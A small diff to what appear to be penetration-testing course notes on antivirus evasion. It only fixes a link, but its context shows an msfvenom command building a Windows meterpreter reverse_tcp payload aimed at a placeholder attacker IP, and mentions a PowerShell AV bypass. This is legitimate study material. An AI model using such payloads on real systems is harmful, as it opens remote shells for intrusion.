@@ -93,7 +93,7 @@ msfvenom -p windows/meterpreter/reverse_tcp LHOST=<attacker_ip> LPORT=<port>
 In order to get it to run, you need to be mindful of the user's [Execution Policy](Execution%20Policy.md).  
   
   
-From [Exercise #6:](17%20-%20AV%20Evasion.md#17.3.5.6) 
+From [Exercise #6:](e17%20-%20AV%20Evasion.md#17.3.5.6) 
   
 Although the PowerShell AV bypass we covered in this module is substantial, it has an inherent limitation:  
 The malicious script cannot be "double-clicked" by the user for an immediate execution. Instead, it would open in **notepad.exe** or another default text editor.  
